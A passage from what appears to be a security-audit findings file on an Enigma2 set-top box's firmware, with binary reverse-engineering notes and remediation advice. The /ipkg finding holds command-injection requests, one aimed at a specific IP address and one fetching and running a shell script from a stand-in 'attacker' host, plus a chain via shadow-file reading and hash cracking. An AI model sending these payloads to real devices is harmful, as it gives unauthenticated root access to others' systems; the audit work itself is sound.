        "→ execvp('/bin/sh', ['/bin/sh', '-c', cmd, NULL])"
    ),
    "binary_evidence": {
        "execvp_call_site": "0x00083f24",
        "execvp_plt": "0x000790c8",
        "shell_path_literal_va": "0x00262e26",
        "shell_path_string": "/bin/sh",
        "dash_c_literal_va": "0x00262e2e",
        "dash_c_string": "-c",
        "argv_construction_va": "0x00085648",
        "argv": "['/bin/sh', '-c', eConsoleCmd, NULL]",
        "eConsole_binding_va": "0x000856ac",
    },
    "exploit_path": (
        "GET /ipkg?command=install&package=;id HTTP/1.1\n"
        "Host: 82.84.145.15\n\n"
        "Resulting cmd: '/usr/bin/opkg install  ;id '\n"
        "Shell executes: '/usr/bin/opkg install' (fails), then 'id' as root"
    ),
    "exploit_rce_example": (
        "GET /ipkg?command=install&package=;wget+-O-+http://attacker/shell.sh|sh HTTP/1.1\n"
        "→ downloads and executes attacker-controlled shell script as root"
    ),
    "sanitization": "NONE — package parameter is appended verbatim to shell command string",
    "affected_actions": ["install", "remove", "info", "status"],
    "chain_context": (
        "Simpler RCE path than E2-CHAIN-1. No credential brute-force or FTP needed.\n"
        "E2-F04 (auth=False default) → E2-F07 = unauthenticated RCE as root.\n"
        "Even with auth enabled, E2-F01 (/web/getipv6 bypass) does not help here;\n"
        "but E2-F07 alone is sufficient when auth is enabled by reading shadow via\n"
        "E2-F02 (file read) + hash crack → authenticated /ipkg access."
    ),
    "remediation": (
        "1. Sanitize the package parameter: whitelist `[a-zA-Z0-9._+-]` only.\n"
        "2. Use execvp directly (avoid shell): construct argv list without shell.\n"
        "3. Pass args as separate list elements to eConsoleAppContainer, not concatenated string."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# SYSTEM() CALL INVESTIGATION: 0x90238 / 0x90284 — SHUTDOWN MECHANISM (NOT INJECTABLE)
# ──────────────────────────────────────────────────────────────────────────────

E2_BIN_SYSTEM_SHUTDOWN_ANALYSIS = {
    "title": "system() at 0x90284 — enigma2 shutdown mechanism, not injectable",
    "call_site_va": "0x00090284",
    "format_string": "%s %i &",
    "format_string_va": "0x0026473d",
    "arg_r2_source": "BSS 0x32184c — pointer to shutdown script path (set at runtime)",
    "arg_r3_source": "BSS 0x300bc0 — shutdown state integer (1=halt, 2=reboot, 4=update-reboot)",
    "next_rodata_string": "/var/volatile/.eshutdown.sh",
    "conclusion": (
        "The command string at *0x32184c is the fixed runtime path '/var/volatile/.eshutdown.sh'. "
        "The integer at *0x300bc0 is a shutdown mode code (1/2/4) set by setPowerState() "
        "in OpenWebif models/control.py → session.open(TryQuitMainloop, state). "
        "Neither argument is user-controllable as an injectable string. "
        "The shell script at 0x2644d8 handles states 1 (halt), 2 (reboot), 4 (opkg-update+reboot). "
        "Not a vulnerability."
    ),
    "execvp_vs_system_confusion": (
        "Prior session incorrectly attributed execvp callers to this function. "
        "Corrected: execvp at 0x83f24 is in eConsoleAppContainer (E2-F07 path). "
        "system() at 0x90284 is the shutdown mechanism. These are separate code paths."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING E2-BIN-F04: vsftpd 3.0.2 binary RE — CLEAN (INFO)
# ──────────────────────────────────────────────────────────────────────────────
#
# Binary: /usr/sbin/vsftpd (port 21), 89380 bytes, ARM32 EABI5 ET_EXEC, stripped
# SHA256: 7a63c61ff78da27bcf5a2a6411905a16c81025b3b83cb34277293d38dd24323b
# LOAD segment: vaddr=0x10000, file_off=0x0
# .text: VA=0x12200, size=0xf904 (63748 bytes)
# PLT: resolver 20 bytes, first stub at 0x11bfc, stride 12
#
# DANGEROUS IMPORT SURVEY:
#   sprintf:  ABSENT from PLT — not imported
#   strcpy:   ABSENT from PLT — not imported
#   snprintf: PLT 0x11fc8 — 6 callers:
#             0x1e6fc, 0x1e728, 0x1e758, 0x1e798, 0x1f2b4 → r1=#0x20 (32-byte limit)
#             0x2032c → r1=#0xd (13-byte limit, set at 0x202f0; timezone string formatter)
#             ALL 6 callers: n is a compile-time literal. No user-controlled size.
#   strncpy:  PLT 0x11ff8 — 7 callers (cluster 0x205b0-0x2064c):
#             All use literal n values: r2=#3 or r2=#5 for IP address octet parsing.
#             All safe — no user-controlled n or dest size.
#   memcpy:   PLT 0x11ce0 — 0 direct BL callers (compiler-inlined or unused direct calls)
#   fchmod:   PLT 0x121f0 — 1 caller at 0x1f2f0 (within wrapper fn@0x1f2e8):
#             ubfx r1, r1, #0, #9  ; mask mode to bits[8:0] (rwxrwxrwx only, no setuid/setgid)
#             bl fchmod(fd, masked_mode)
#             Called from fn@0x14424 (post-upload file permission handler) via function pointer.
#             NOT the SITE CHMOD handler — this sets file permissions after a STOR upload.
#   chmod:    PLT 0x12178 — 0 BL callers; 1 B (tail-call) from chmod_wrapper at 0x1f310:
#             ubfx r1, r1, #0, #9  ; same mask (no setuid/setgid/sticky)
#             b chmod_plt            ; tail-call to path-based chmod()
#             chmod_wrapper (0x1f30c) has 0 BL callers — dispatched via function pointer.
#             This IS the SITE CHMOD path; mode sanitized at binary level.
#   atoi:     PLT 0x12118 — 6 callers (all in IP address / timezone octet parsing, 0x205e4-0x20670)
#             NOT in SITE CHMOD handler — mode parsed by internal octal converter, not atoi.
#
# SITE CHMOD BINARY ANALYSIS:
#   Mode argument: ubfx r1, r1, #0, #9 strips setuid (bit11), setgid (bit10), sticky (bit9).
#   Maximum mode set: 0777 (rwxrwxrwx). Attacker cannot plant setuid root binaries via SITE CHMOD.
#   Path argument: processed by vsftpd path resolution before handler call; no binary-level injection.
#   Risk is configuration-level (no chroot_local_user → full filesystem chmod) — captured in E2-F03.
#
# SITE CHMOD DISPATCH:
#   Table at 0x15a28: [CHMOD_str, needs_2_args_str, handler_addr, fail_str, ok_str, UMASK_str, ...]
#   handler_addr = 0x358e8 (outside binary text section — indicates function-pointer dispatch via
#   a data structure not a direct BL; actual chmod_wrapper at 0x1f30c confirmed by B tail-call trace)
#
# PLT NOTABLE ABSENCES: no system(), no popen(), no exec*() — vsftpd does not shell-exec anything.
# libcap functions present (cap_set_proc, cap_init, cap_set_flag, cap_free, cap_get_proc) —
# POSIX capabilities for privilege drop (cap_net_bind_service → non-root bind port 21).
#
# TVFS: string at file offset 82799 is a FEAT response entry ("TVFS").
# No TVFS-specific command handler found — TVFS is a naming-convention advertisement per RFC 3659 §7.
# The custom VU+ TVFS extension adds one line to the FEAT response only; no new code path.

E2_BIN_F04_VSFTPD_RE = {
    "finding_id": "E2-BIN-F04",
    "severity": "INFO",
    "status": "CLEAN",
    "title": "vsftpd 3.0.2 binary RE: no memory corruption — all string ops bounded, SITE CHMOD mode sanitized",
    "binary": "/usr/sbin/vsftpd",
    "binary_size_bytes": 89380,
    "sha256": "7a63c61ff78da27bcf5a2a6411905a16c81025b3b83cb34277293d38dd24323b",
    "plt_map": {
        "resolver_size_bytes": 20,
        "first_stub_va": "0x11bfc",
        "stub_stride_bytes": 12,
        "snprintf": "0x11fc8",
        "strncpy": "0x11ff8",
        "memcpy": "0x11ce0",
        "fchmod": "0x121f0",
        "chmod": "0x12178",
        "atoi": "0x12118",
        "syscall": "0x11f2c",
        "notable_absences": ["system", "popen", "execl", "execvp", "execve", "sprintf", "strcpy"],
    },
    "string_op_analysis": {
        "snprintf_callers": 6,
        "snprintf_size_args": {
            "0x1e6fc": "r1=0x20 (32 bytes)",
            "0x1e728": "r1=0x20 (32 bytes)",
            "0x1e758": "r1=0x20 (32 bytes)",
            "0x1e798": "r1=0x20 (32 bytes)",
            "0x1f2b4": "r1=0x20 (32 bytes)",
            "0x2032c": "r1=0x0d (13 bytes, set at 0x202f0; timezone string formatter)",
        },
        "strncpy_callers": 7,
        "strncpy_n_args": "all literal: r2=#3 or r2=#5 (IP address octet parsing, 0x205b0-0x2064c)",
        "memcpy_direct_bl_callers": 0,
        "verdict": "No unbound string operations. No user-controlled size argument in any call.",
    },
    "chmod_analysis": {
        "mode_sanitization": "ubfx r1, r1, #0, #9 at both fchmod_wrapper (0x1f2e8) and chmod_wrapper (0x1f30c)",
        "effect": "Mode masked to bits[8:0] = rwxrwxrwx only. setuid/setgid/sticky bits stripped.",
        "fchmod_wrapper_va": "0x1f2e8",
        "fchmod_caller": "0x1461c in fn@0x14424 (post-STOR file permission setter)",
        "chmod_wrapper_va": "0x1f30c",
        "chmod_callers": "0 BL callers; invoked via function pointer from SITE command dispatch",
        "path_handling": "Path resolved by vsftpd before handler call; no binary-level path injection",
        "risk_locus": "Configuration (no chroot_local_user in E2-F03) not binary",
    },
    "tvfs_extension": {
        "string_file_offset": 82799,
        "string_value": "TVFS",
        "implementation": "FEAT response string only — no TVFS command handler found in binary",
        "conclusion": "TVFS is a naming-convention advertisement (RFC 3659 §7). Zero new attack surface.",
    },
    "conclusion": (
        "vsftpd 3.0.2 custom VU+ binary is CLEAN for binary-level memory corruption. "
        "All string operations use bounded functions with compile-time literal size arguments. "
        "sprintf and strcpy are not imported. No shell-exec in PLT. "
        "SITE CHMOD mode is sanitized at binary level (ubfx strips setuid/setgid bits). "
        "All security risk from vsftpd is configuration-level (E2-F03, E2-F06, E2-F10). "
        "Binary RE of vsftpd is complete."
    ),
}
